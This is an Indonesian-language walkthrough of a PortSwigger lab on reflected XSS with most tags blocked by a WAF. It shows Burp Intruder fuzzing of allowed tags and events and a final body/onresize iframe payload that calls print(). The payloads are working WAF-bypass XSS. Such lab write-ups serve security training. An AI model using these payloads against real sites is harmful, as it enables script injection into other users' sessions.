
# Reflected XSS into HTML context with most tags and attributes blocked
# Reflected XSS dalam Konteks HTML dengan Kebanyakan Tag dan Atribut Diblokir

Lab ini mengandung kerentanan **Reflected Cross-Site Scripting (XSS)** pada fungsi pencarian, namun dilindungi oleh **Web Application Firewall (WAF)** yang mencegah vektor XSS umum.

Untuk menyelesaikan lab ini, Anda perlu melakukan serangan cross-site scripting yang dapat melewati WAF dan memanggil fungsi `print()`.

**Catatan:** Solusi Anda tidak boleh memerlukan interaksi pengguna. Mengaktifkan `print()` secara manual di browser Anda sendiri tidak akan menyelesaikan lab ini.

---------------------------------------------

## Referensi:

- [PortSwigger: Exploiting Cross-Site Scripting](https://portswigger.net/web-security/cross-site-scripting/exploiting)
- [PortSwigger: XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [MDN Web Docs: XMLHttpRequest.send()](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/send)

![Langkah 1](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/1.png)

---------------------------------------------

# Reflected XSS dalam Konteks HTML dengan Kebanyakan Tag dan Atribut Diblokir

Lab ini mengandung kerentanan **Reflected Cross-Site Scripting (XSS)** pada fungsi pencarian, namun dilindungi oleh **Web Application Firewall (WAF)** yang mencegah vektor XSS umum.

Untuk menyelesaikan lab ini, Anda perlu melakukan serangan cross-site scripting yang dapat melewati WAF dan memanggil fungsi `print()`.

**Catatan:** Solusi Anda tidak boleh memerlukan interaksi pengguna. Mengaktifkan `print()` secara manual di browser Anda sendiri tidak akan menyelesaikan lab ini.

---------------------------------------------

## Referensi:

- [PortSwigger: Exploiting Cross-Site Scripting](https://portswigger.net/web-security/cross-site-scripting/exploiting)
- [PortSwigger: XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [MDN Web Docs: XMLHttpRequest.send()](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/send)

---------------------------------------------

## Langkah-Langkah Eksploitasi

### 1. Menyuntikkan Vektor XSS Standar

Pertama, kita mencoba menyuntikkan vektor XSS standar untuk menguji apakah WAF memblokirnya.

```html
<img src=1 onerror=print()>
```

**Pengamatan:** Payload ini diblokir oleh WAF.

### 2. Menggunakan Burp Intruder untuk Menguji Tag dan Atribut yang Diblokir

Kita akan menggunakan **Burp Suite Intruder** untuk menguji tag dan atribut mana yang diblokir oleh WAF.

#### a. Mengirim Permintaan ke Burp Intruder

1. **Buka Burp Suite dan Konfigurasikan Proxy:**
   - Pastikan browser Anda terhubung dengan Burp Suite melalui proxy.
   
2. **Gunakan Fungsi Pencarian di Lab:**
   - Masuk ke aplikasi web lab dan gunakan fungsi pencarian dengan memasukkan payload standar yang telah diblokir sebelumnya.
   
3. **Tangkap Permintaan di Burp Proxy:**
   - Permintaan pencarian akan ditangkap oleh Burp Suite. Kirimkan permintaan tersebut ke **Burp Intruder** dengan mengklik kanan pada permintaan dan memilih `Send to Intruder`.

#### b. Menyiapkan Payload Positions

1. **Ganti Nilai Istilah Pencarian:**
   - Di **Burp Intruder**, ubah nilai dari istilah pencarian menjadi `<>`.
   
   ```plaintext
   GET /?search=<§§> HTTP/2
   Host: 0aea005104d1419c805a3fe60055007f.web-security-academy.net
   Cookie: session=9FSUj13f4MvEvCHHqnpyuvyXNGkFU3de
   Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
   Sec-Ch-Ua-Mobile: ?0
   Sec-Ch-Ua-Platform: "Windows"
   Upgrade-Insecure-Requests: 1
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
   Sec-Fetch-Site: same-origin
   Sec-Fetch-Mode: navigate
   Sec-Fetch-User: ?1
   Sec-Fetch-Dest: document
   Referer: https://0aea005104d1419c805a3fe60055007f.web-security-academy.net/
   Accept-Encoding: gzip, deflate, br
   Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
   Priority: u=0, i
   ```

2. **Buat Posisi Payload:**
   - Tempatkan kursor di antara tanda kurung siku (`<>`) dan klik tombol **Add §** untuk membuat posisi payload.
   - Hasilnya, nilai istilah pencarian akan terlihat seperti ini: `<§§>`

#### c. Menyalin Tag dari Cheat Sheet

1. **Kunjungi [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).**
2. **Klik "Copy tags to clipboard":**
   - Ini akan menyalin daftar tag yang dapat digunakan untuk pengujian lebih lanjut.

#### d. Menempelkan Tag ke Burp Intruder

1. **Di Panel Payloads:**
   - Di bawah **Payload configuration**, klik tombol **Paste** untuk menempelkan daftar tag yang telah disalin ke dalam daftar payload.
2. **Mulai Serangan:**
   - Klik tombol **Start attack** untuk memulai serangan.

#### e. Mengamati Hasil Serangan

- **Hasil yang Diharapkan:**
  - Sebagian besar payload akan menghasilkan respons **400 Bad Request**.
  - Payload dengan tag `<body>` menghasilkan respons **200 OK**.

### 3. Menguji Atribut yang Diperbolehkan

Setelah mengetahui bahwa tag `<body>` diterima, kita akan menguji atribut yang diperbolehkan untuk memanggil fungsi `print()`.

#### a. Menyiapkan Payload Positions

1. **Ganti Istilah Pencarian dengan Payload Baru:**

   ```plaintext
   GET /?search=<body%20§§=1> HTTP/2
   Host: 0aea005104d1419c805a3fe60055007f.web-security-academy.net
   Cookie: session=9FSUj13f4MvEvCHHqnpyuvyXNGkFU3de
   Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
   Sec-Ch-Ua-Mobile: ?0
   Sec-Ch-Ua-Platform: "Windows"
   Upgrade-Insecure-Requests: 1
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
   Sec-Fetch-Site: same-origin
   Sec-Fetch-Mode: navigate
   Sec-Fetch-User: ?1
   Sec-Fetch-Dest: document
   Referer: https://0aea005104d1419c805a3fe60055007f.web-security-academy.net/
   Accept-Encoding: gzip, deflate, br
   Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
   Priority: u=0, i
   ```

2. **Buat Posisi Payload:**
   - Tempatkan kursor sebelum karakter `=` dan klik tombol **Add §** untuk membuat posisi payload.
   - Hasilnya, nilai istilah pencarian akan terlihat seperti ini: `<body%20§§=1>`

#### b. Menyalin Atribut dari Cheat Sheet

1. **Kunjungi Kembali [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).**
2. **Klik "Copy events to clipboard":**
   - Ini akan menyalin daftar atribut event yang dapat digunakan untuk pengujian lebih lanjut.

#### c. Menempelkan Atribut ke Burp Intruder

1. **Di Panel Payloads:**
   - Klik tombol **Clear** untuk menghapus payload sebelumnya.
   - Klik tombol **Paste** untuk menempelkan daftar atribut event yang telah disalin ke dalam daftar payload.
2. **Mulai Serangan:**
   - Klik tombol **Start attack** untuk memulai serangan.

#### d. Mengamati Hasil Serangan

- **Hasil yang Diharapkan:**
  - Sebagian besar payload akan menghasilkan respons **400 Bad Request**.
  - Payload dengan atribut `onresize` menghasilkan respons **200 OK**.

### 4. Menyusun Payload Akhir untuk Memanggil Fungsi `print()`

Dengan mengetahui bahwa atribut `onresize` diperbolehkan, kita akan menyusun payload yang memanggil fungsi `print()` secara otomatis tanpa interaksi pengguna.

#### a. Menyusun Payload dengan Tag `<body>` dan Atribut `onresize`

```html
<body onresize="print()">
```

#### b. Mengirimkan Payload melalui Iframe

Kita akan menyisipkan payload ini dalam sebuah iframe dan memanfaatkan event `onload` untuk memicu perubahan ukuran yang akan memanggil fungsi `print()`.

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cbody%20onresize%3Dprint%28%29%3E" height="100%" title="Iframe Example" onload="body.style.width='100px'"></iframe>
```

**Instruksi:**

1. **Ganti `YOUR-LAB-ID` dengan ID lab Anda:**
   - Contoh: Jika ID lab Anda adalah `0aea005104d1419c805a3fe60055007f`, maka URL akan menjadi `https://0aea005104d1419c805a3fe60055007f.web-security-academy.net/?search=%3Cbody%20onresize%3Dprint%28%29%3E`.

2. **Sisipkan Kode Iframe ke dalam Fungsi Pencarian:**
   - Masukkan kode iframe di atas ke dalam fungsi pencarian dan kirimkan permintaan tersebut.

3. **Kirimkan Exploit ke Korban:**
   - Klik **Store and Deliver exploit to victim** untuk menyampaikan exploit kepada korban.

#### c. Contoh Permintaan HTTP

Berikut adalah contoh permintaan HTTP yang dikirimkan oleh Burp Intruder saat menguji tag dan atribut:

1. **Permintaan Pertama: Menyalin Tag**

    ```plaintext
    GET /?search=<§§> HTTP/2
    Host: 0aea005104d1419c805a3fe60055007f.web-security-academy.net
    Cookie: session=9FSUj13f4MvEvCHHqnpyuvyXNGkFU3de
    Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "Windows"
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: https://0aea005104d1419c805a3fe60055007f.web-security-academy.net/
    Accept-Encoding: gzip, deflate, br
    Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
    Priority: u=0, i
    ```

2. **Permintaan Kedua: Menyalin Atribut**

    ```plaintext
    GET /?search=<body%20§§=1> HTTP/2
    Host: 0aea005104d1419c805a3fe60055007f.web-security-academy.net
    Cookie: session=9FSUj13f4MvEvCHHqnpyuvyXNGkFU3de
    Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "Windows"
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: https://0aea005104d1419c805a3fe60055007f.web-security-academy.net/
    Accept-Encoding: gzip, deflate, br
    Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
    Priority: u=0, i
    ```

3. **Payload Akhir: Iframe dengan Event `onresize`**

    ```html
    <iframe src="https://0aea005104d1419c805a3fe60055007f.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" height="100%" title="Iframe Example" onload="body.style.width='100px'"></iframe>
    ```

### 5. Memverifikasi Eksekusi Payload

Setelah mengirimkan payload, verifikasi apakah fungsi `print()` telah dipanggil secara otomatis tanpa interaksi pengguna. Anda dapat melakukannya dengan:

- **Memeriksa Dialog Cetak:**
  - Jika fungsi `print()` berhasil dipanggil, dialog cetak browser akan muncul secara otomatis.
  
- **Melihat Log Aktivitas di Konsol Browser:**
  - Buka konsol pengembang di browser dan periksa apakah ada pesan atau aktivitas yang terkait dengan pemanggilan fungsi `print()`.

## Penjelasan

**Reflected Cross-Site Scripting (XSS)** adalah jenis kerentanan di mana skrip berbahaya disuntikkan ke dalam respons HTTP langsung melalui input pengguna. Dalam kasus ini, skrip dijalankan di konteks HTML dengan sebagian besar tag dan atribut yang umum diblokir oleh WAF.

### Mengatasi Pembatasan WAF

WAF sering kali memblokir tag dan atribut yang umum digunakan untuk serangan XSS, seperti `<script>`, `onerror`, dan lain-lain. Namun, masih ada beberapa event handler yang diperbolehkan, seperti `onbeforeinput`, `onratechange`, `onscrollend`, dan `onresize`. Dengan memanfaatkan event handler ini pada tag yang diperbolehkan seperti `<body>`, kita dapat menjalankan skrip berbahaya.

### Payload Iframe dengan Event `onresize`

Dengan menggunakan tag `<body>` dan atribut `onresize`, kita dapat memanggil fungsi `print()` secara otomatis. Untuk memicu event `resize` tanpa interaksi pengguna, kita menyisipkan iframe yang memuat halaman dengan payload XSS dan menggunakan event `onload` pada iframe untuk mengubah gaya `body`, yang akan memicu event `resize`.

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" height="100%" title="Iframe Example" onload="body.style.width='100px'"></iframe>
```

### Pentingnya Validasi dan Sanitasi Input

Kerentanan XSS dapat digunakan untuk menjalankan skrip berbahaya dalam konteks pengguna yang terautentikasi, memungkinkan penyerang untuk melakukan berbagai tindakan tidak sah. Oleh karena itu, sangat penting untuk selalu memvalidasi dan menyaring input pengguna di sisi server untuk mencegah penyuntikan skrip berbahaya.

## Kesimpulan

Eksploitasi **Reflected XSS** dalam konteks HTML dengan pembatasan WAF memerlukan kreativitas dalam memilih tag dan atribut yang masih diperbolehkan. Dengan memanfaatkan event handler yang tersedia dan teknik seperti penggunaan iframe, penyerang dapat menjalankan skrip berbahaya seperti memanggil fungsi `print()` tanpa memerlukan interaksi pengguna. Penting untuk selalu menerapkan praktik keamanan terbaik, seperti sanitasi input dan konfigurasi WAF yang tepat, untuk mencegah kerentanan ini.

## Referensi Tambahan

- [OWASP Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
